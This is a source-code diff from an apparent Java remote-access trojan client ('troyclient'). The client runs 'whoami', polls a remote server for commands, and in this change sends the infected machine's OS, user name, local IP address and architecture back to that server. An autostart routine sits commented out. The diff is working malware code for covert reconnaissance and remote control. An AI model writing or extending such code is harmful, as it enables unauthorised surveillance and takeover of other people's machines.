@@ -3,11 +3,12 @@ package ch.lebois.troyclient.main;
 import ch.lebois.troyclient.service.Console;
 import ch.lebois.troyclient.service.Sender;
 import ch.lebois.troyclient.service.WebHandler;
-
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 import java.nio.channels.FileChannel;
 
 /**
@@ -25,9 +26,8 @@ public class ConfigureInit {
     public void configure(String url) {
         GetContext.CLIENT_NAME = Console.execute("whoami").get(1).replace("\\", "-");
         GetContext.SENDER = new Sender(url);
-
         webHandler = new WebHandler(url + "/command/" + GetContext.CLIENT_NAME);
-        operatingSystem();
+        getConstants();
 //        autostart();
     }
 
@@ -50,11 +50,14 @@ public class ConfigureInit {
 
     }
 
-    public void operatingSystem() {
+    public void getConstants() {
+        GetContext.SENDER.send("os", System.getProperty("os.name"));
+        GetContext.SENDER.send("user", System.getProperty("user.name"));
         try {
-            GetContext.SENDER.send("os", Console.execute("wmic os get caption").get(3));
-        } catch (Exception e) {
-            GetContext.SENDER.send("os", "linux");
+            GetContext.SENDER.send("ip", InetAddress.getLocalHost().getHostAddress());
+        } catch (UnknownHostException e) {
+            e.printStackTrace();
         }
+        GetContext.SENDER.send("arch", System.getProperty("os.arch"));
     }
 }
